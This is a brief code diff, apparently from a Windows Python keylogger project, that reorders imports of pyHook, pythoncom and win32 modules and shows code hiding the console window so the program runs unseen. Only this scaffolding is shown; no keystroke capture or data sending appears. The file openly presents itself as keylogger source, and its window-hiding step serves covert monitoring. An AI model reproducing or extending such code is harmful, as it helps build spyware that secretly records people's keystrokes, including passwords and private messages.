@@ -1,10 +1,11 @@
 # Python code for keylogger
 # to be used in windows
+import pyHook
+import pythoncom
+
 import win32api
 import win32console
 import win32gui
-import pythoncom
-import pyHook
 
 win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
